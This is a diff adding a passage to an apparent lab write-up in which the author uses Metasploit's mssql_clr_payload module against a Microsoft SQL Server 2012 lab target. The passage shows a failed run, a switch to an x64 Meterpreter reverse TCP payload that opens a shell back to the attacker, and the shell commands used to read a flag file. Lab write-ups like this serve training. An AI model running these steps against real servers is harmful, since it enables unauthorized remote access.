@@ -33,7 +33,28 @@ We can identify the por 1433 is open and running  Microsoft SQL Server 2012 11.0
 
 Let's choose `exploit/windows/mssql/mssql_clr_payload` and `show the options` in order to check the parameters we need to set `set RHOSTS target.ine.local` if we hit run, we ill get the following error
 
+```
+msf6 exploit(windows/mssql/mssql_clr_payload) > run
 
+[*] Started reverse TCP handler on 10.10.48.2:4444 
+[!] 10.3.26.89:1433 - Setting EXITFUNC to 'thread' so we don't kill SQL Server
+[-] 10.3.26.89:1433 - Exploit aborted due to failure: bad-config: Target SQL server arch is x64, payload architecture is x86
+[*] Exploit completed, but no session was created.
+```
+
+Therefore we need to change the payload to x64 `set payload windows/x64/meterpreter/reverse_tcp` then we run it and obtaine a meterpreter session:
+
+<img width="809" height="308" alt="Screenshot 2026-03-01 at 9 29 40 PM" src="https://github.com/user-attachments/assets/0960edd1-15c1-4303-8572-fda475d42f46" />
+
+Once we have the session let's go to the C:\ directory and get the first flag 
+
+```
+shell
+cd /
+dir
+type flag1.txt
+```
+<img width="573" height="320" alt="Screenshot 2026-03-01 at 9 32 51 PM" src="https://github.com/user-attachments/assets/0faadb9e-4433-458e-8314-0e77c560670d" />
 
 
 #### Flag 2
